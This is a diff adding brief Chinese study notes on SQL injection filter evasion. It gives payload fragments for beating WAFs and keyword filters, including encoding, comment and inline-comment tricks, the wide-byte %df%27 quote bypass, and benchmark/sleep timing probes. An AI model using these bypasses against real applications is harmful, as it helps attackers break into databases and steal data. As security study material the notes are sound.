@@ -1,0 +1,43 @@
+SQL注入的绕过方式
+
+大小写绕过
+
+双写绕过
+
+编码绕过security-->hex编码  urlencode
+
+注释符绕过 sel/**/ect
+
+空格的绕过  select/**/tables
+
+or和and的过滤	and=&&	or=||
+
+单引号的过滤	宽字节绕过%df%27
+
+反引号
+反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！
+select username,password from `table1` where id='1' limit 0,1
+
+select，union等被过滤
+内联注释
+and /*!select*/
+<>绕过
+sele<>ct	uni<>on
+
+屏蔽逗号
+select substr("xx",1,3) ---->select("xx" from 1 to 3)
+
+屏蔽了sleep
+可以使用
+and sleep(1)
+and benchmark(100000000,1);
+
+group_concat屏蔽了
+select group_concat("haha","niao");
+select concat_ws(" ","haha","niao");
+
+等于号被屏蔽
+可以使用like，还有<>代替等于号来绕过屏蔽
+
+post的时候屏蔽了#注释
+可以使用空格--a来代替注释
